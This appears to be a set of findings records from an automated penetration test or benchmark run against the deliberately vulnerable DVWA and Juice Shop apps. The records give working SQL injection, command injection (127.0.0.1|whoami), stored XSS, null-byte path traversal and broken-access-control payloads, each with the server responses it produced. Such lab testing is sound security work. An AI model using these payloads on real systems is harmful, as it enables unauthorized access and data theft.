findings.title: SQL Injection in DVWA SQLi id parameter [security=low]
findings.response_evidence: [security=low] TRUE condition (id=1' OR '1'='1) returned 5 records: surnames admin, Brown, Me, Picasso, Smith (first names admin, Gordon, Hack, Pablo, Bob). FALSE condition (id=1' AND '1'='2) returned zero records: the page shows 'User ID:' with no 'ID:' result rows. Differential confirms injectable quoted boolean.

findings.title: [security=high] OS Command Injection via ip parameter using pipe without trailing space (127.0.0.1|whoami)
findings.response_evidence: [security=high] Response to ip=127.0.0.1|whoami (no space after pipe) HTTP 200 on /vulnerabilities/exec/ with page body 'Ping a device Enter an IP address: www-data' and 'Security Level: high'. The web-process identity 'www-data' appears in the command output, confirming OS command execution.

findings.title: Login authentication bypass via SQL injection in email field (admin token issued)
findings.response_evidence: HTTP 200 application/json: {"authentication":{"token":"[REDACTED_JWT]","bid":1,"umail":"admin@juice-sh.op"}}. A valid JWT was issued for the first user admin@juice-sh.op without valid credentials, proving the email value was injected into the authentication query.

findings.title: Cross-user basket read (BOLA) on GET /rest/basket/{id}
findings.response_evidence: acct1 (session_info own_basket_id=6) GET /rest/basket/6 -> 200: {"status":"success","data":{"id":6,"UserId":22,"Products":[{"id":1,"name":"Apple Juice (1000ml)",...,"BasketItem":{"ProductId":1,"BasketId":6,"id":9,"quantity":3}}]}}. acct2 (session_info email acct2_bench@juiceshop.local, own_basket_id=7) GET /rest/basket/6 -> 200 with identical body: id 6, UserId 22, Products Apple Juice (1000ml), quantity 3. acct2's own basket 7 (UserId 23) contains Orange Juice (1000ml) qty 1. acct2 therefore retrieved acct1's basket and its distinct seeded item (Apple Juice (1000ml), qty 3) without owning it; no ownership check is enforced.

findings.title: Confidential acquisitions memo exposed via open /ftp/ directory listing
findings.response_evidence: Listing: 200 text/html 'listing directory /ftp/' includes 'acquisitions.md 909 12/19/2023'. Direct retrieval unauthenticated: 200 text/markdown; excerpt: '# Planned Acquisitions > This document is confidential! Do not distribute! Our company plans to acquire several competitors within the next year. This will have a significant stock market impact...'

findings.title: Unauthenticated Feedbacks listing: author email not fully disclosed (masked)
findings.response_evidence: Endpoint returns records without authentication (HTTP 200, {"status":"success","data":[...8 items]}) with fields UserId, id, comment, rating, createdAt, updatedAt. However, no author email is exposed as a field, and the comments embed only masked emails, e.g. '(***in@juice-sh.op)', '(***@juice-sh.op)', '(***der@juice-sh.op)', '(***ereum@juice-sh.op)'; the remaining 5 records show '(anonymous)'. Emails are not full, so the full-PII disclosure criterion is not met. Rejected as CWE-359 PII exposure; the unauthenticated read of feedback content is noted but masking is in place.

findings.title: [security=high] SQL Injection via session-input.php id parameter (out-of-band, stored into session, loaded by /vulnerabilities/sqli/)
request_sequence: POST http://dvwa/security.php security=high&seclev_submit=Submit&user_token=[REDACTED] -> 302 to /security.php; GET shows 'Security level is currently: high' and 'Security level set to high'
findings.response_evidence: [security=high] TRUE payload (id=1' OR '1'='1' #) on GET /vulnerabilities/sqli/ returned 5 records: 'ID: 1' OR '1'='1' # First name: admin Surname: admin', 'First name: Gordon Surname: Brown', 'First name: Hack Surname: Me', 'First name: Pablo Surname: Picasso', 'First name: Bob Surname: Smith'. FALSE payload (id=1' AND '1'='2' #) on the same page returned zero records (no 'First name/Surname' rows; only the 'Click here to change your ID' header and footer). Security level confirmed as high on the security page ('Security level is currently: high'). Note: session_info metadata still reports 'low' but the page body reports high. Trailing comment '#' required for high-level query.

findings.title: Juice Shop product-search SQL injection (q parameter, unauthenticated): SQLITE_ERROR on quote and 9-column UNION data injection
request_sequence: GET http://juiceshop:3000/rest/products/search?q=apple (unauth) -> 200, benign JSON with 'Apple Juice (1000ml)' and 'Apple Pomace', no error
findings.response_evidence: Benign baseline q=apple -> HTTP 200, status 'success', clean product rows, no error. Quote probe q=qwert' -> HTTP 500 body: 'Error: SQLITE_ERROR: near "'%'": syntax error'. UNION probe q=x')) UNION SELECT 1,2,3,4,5,6,7,8,9-- -> HTTP 200 body: {"status":"success","data":[{"id":1,"name":2,"description":3,"price":4,"deluxePrice":5,"image":6,"createdAt":7,"updatedAt":8,"deletedAt":9}]}, where the attacker-chosen column values (2..9) are reflected in the product fields. This confirms the SQL error and successful UNION injection versus the benign baseline.

findings.title: Juice Shop /encryptionkeys/ directory browsable without authentication, exposing premium.key and jwt.pub
request_sequence: GET http://juiceshop:3000/encryptionkeys/ (unauth, Accept: text/html,application/json) -> 200 directory listing
findings.response_evidence: HTTP 200, content-type text/html. Body is a directory listing: 'listing directory /encryptionkeys/ ~ / encryptionkeys / Name Size Modified jwt.pub 248 12/19/2023 1:12:12 PM premium.key 50 12/19/2023 1:12:12 PM'. Links to /encryptionkeys/jwt.pub and /encryptionkeys/premium.key are present in the listing. Both sensitive key files are visible in the unauthenticated listing, so the criterion is met.

findings.parameter: mtxMessage (txtName maxlength=10 not exercised beyond short value 'xssv')
findings.title: Stored XSS in guestbook message field (DVWA Stored XSS) [security=low]
request_sequence: GET http://dvwa/vulnerabilities/xss_s/ (session dvwa_admin; security_level=low confirmed in session_info)
POST http://dvwa/vulnerabilities/xss_s/ session=dvwa_admin form: txtName=xssv, mtxMessage=<script id="test_token">window.xss_flag=1</script>, btnSign=Sign Guestbook
findings.response_evidence: [security=low] POST returned HTTP 200 with the entry rendered ('Name: xssv Message:' with the script element hidden from visible text, i.e. parsed as markup). Server did NOT enforce the 50-char client maxlength: the full 56-char canary was stored unmodified (no truncation). Browser load of the page in dvwa_admin session then browser_eval_js('window.xss_flag') returned 1. Behavioral criterion met.

findings.title: Open directory listing of /ftp/ exposes confidential files (acquisitions.md, legal.md, backups, kdbx)
request_sequence: GET http://juiceshop:3000/ftp/ session=unauth headers: Accept: text/html,application/json
findings.response_evidence: HTTP 200 text/html, served as an unauthenticated 'listing directory /ftp/' index. Listing shows: acquisitions.md (909 bytes), announcement_encrypted.md, coupons_2013.md.bak, eastere.gg, encrypt.pyc, incident-support.kdbx, legal.md, package.json.bak (4291 bytes), suspicious_errors.yml, quarantine/. Links to acquisitions.md confirmed in listing. (acquisitions.md content retrieval was already verified separately; only listing evidence recorded here.)

findings.title: Poison null-byte path traversal bypasses /ftp/ extension filter to retrieve package.json.bak
findings.response_evidence: Raw path: HTTP 403 'Error: Only .md and .pdf files are allowed!' (fileServer.js verify). Null-byte path: HTTP 200, content-type application/octet-stream, body begins with the restricted backup file contents: '{ "name": "juice-shop", "version": "6.2.0-SNAPSHOT", "description": "An intentionally insecure JavaScript Web Application", ... "dependencies": {...}}'. Both observations hold: filter bypass achieved via %2500 + .md suffix.

findings.title: SQL Injection (numeric boolean) in POST id parameter [security=medium]
request_sequence: GET http://dvwa/security.php (dvwa_admin) -> page reads 'Security level is currently: medium'
findings.response_evidence: [security=medium] TRUE payload id='1 OR 1=1' -> HTTP 200, 5 records: 'ID: 1 OR 1=1 First name: admin Surname: admin', 'First name: Gordon Surname: Brown', 'First name: Hack Surname: Me', 'First name: Pablo Surname: Picasso', 'First name: Bob Surname: Smith'. FALSE payload id='1 AND 1=2' -> HTTP 200, zero records (only the 'User ID: 1 2 3 4 5' dropdown text, no 'First name/Surname' rows). Security level confirmed as medium on the security page. Behavioral TRUE/FALSE differential proves SQL injection via unquoted numeric context at medium.

findings.title: Poison null-byte path traversal bypasses /ftp/ extension filter to retrieve package.json.bak
request_sequence: GET http://juiceshop:3000/ftp/package.json.bak (unauth, Accept: text/html,application/json) -> 403 'Error: Only .md and .pdf files are allowed!'
findings.response_evidence: Raw path: HTTP 403 with body 'Error: Only .md and .pdf files are allowed!'. Null-byte bypass: HTTP 200 with package.json content: '{ "name": "juice-shop", "version": "6.2.0-SNAPSHOT", "description": "An intentionally insecure JavaScript Web Application", ... "dependencies": {...}}'. Filter bypassed via %2500 + .md extension, restricted backup file retrieved unauthenticated.
